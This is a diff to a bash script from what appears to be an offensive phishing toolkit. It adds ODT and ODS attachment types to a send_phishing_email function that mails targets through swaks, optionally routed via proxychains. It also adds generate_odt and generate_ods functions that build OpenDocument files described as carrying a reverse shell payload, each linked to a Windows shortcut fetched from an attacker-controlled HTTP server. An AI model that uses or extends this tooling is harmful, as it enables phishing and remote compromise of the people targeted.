@@ -115,6 +115,14 @@ send_phishing_email() {
             echo "Attachment file not found. Please generate the Excel attachment first."
             return 1
         fi
+    elif [[ "$attachment_type" == "odt" ]]; then
+        generate_odt
+        attach_type_option="--attach-type application/vnd.oasis.opendocument.text"
+        attachment=output.odt
+    elif [[ "$attachment_type" == "ods" ]]; then
+        generate_ods
+        attach_type_option="--attach-type application/vnd.oasis.opendocument.spreadsheet"
+        attachment=output.ods
     fi
     if [[ -z "$target_email" ]]; then
         echo "Target email is not set. Please set it before sending the email."
@@ -159,7 +167,7 @@ send_phishing_email() {
     if [[ $attachment_type == "hyperlink" ]]; then
         attachment_option=""
     fi
-    ${proxychain_command}swaks -t $target_email --from $sender_email $attach_type_option $attachment_option --header "$email_header" --body @email_body.txt --server $smtp_server $smtp_authentication
+    ${proxychain_command}swaks -t $target_email --from $sender_email $attach_type_option $attachment_option --header "$email_header" --body @email_body.txt $swaks_additional_options --server $smtp_server $smtp_authentication
 }
 
 get_word_macro() {
@@ -184,16 +192,26 @@ get_xls_macro() {
 
 generate_odt() {
     echo "Generating ODT file with reverse shell payload."
-    cp $SCRIPTDIR/../python/generate_odt.py .
+    cp $SCRIPTDIR/../python/generate_od.py .
     cp $SCRIPTDIR/../xml/content.xml .
     cp $SCRIPTDIR/../xml/manifest.xml .
     cp $SCRIPTDIR/../xml/script-lb.xml .
     cp $SCRIPTDIR/../xml/script-lc.xml .
     generate_windows_shortcut
-    if [[ -z "$cmd" ]]; then
-        cmd=$(get_powershell_interactive_shell)
-    fi
-    python3 generate_odt.py output.odt "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"
+    python3 generate_od.py output.odt "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"
+
+}
+
+generate_ods() {
+    echo "Generating ODS file with reverse shell payload."
+    cp $SCRIPTDIR/../python/generate_od.py .
+    cp $SCRIPTDIR/../xml/content_ods.xml content.xml
+    cp $SCRIPTDIR/../xml/manifest.xml .
+    cp $SCRIPTDIR/../xml/script-lb.xml .
+    cp $SCRIPTDIR/../xml/script-lc.xml .    
+    sed -E -i 's/opendocument\.text/opendocument\.spreadsheet/g' manifest.xml
+    generate_windows_shortcut
+    python3 generate_od.py output.ods "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"
 
 }
 
